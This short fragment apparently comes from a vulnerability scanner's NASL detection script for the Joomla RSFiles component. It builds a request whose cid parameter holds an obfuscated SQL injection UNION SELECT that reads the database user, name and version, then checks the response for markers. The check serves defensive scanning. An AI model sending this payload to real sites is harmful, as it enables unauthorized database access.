...
url = dir + "/index.php?option=com_rsfiles&view=files&layout=agreement&" + "tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONC" + "AT_WS(CHAR(32,58,32),user(),database(),version())--";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "File:", extra_check: make_list( "I Agree",
	 "I Disagree" ) )){
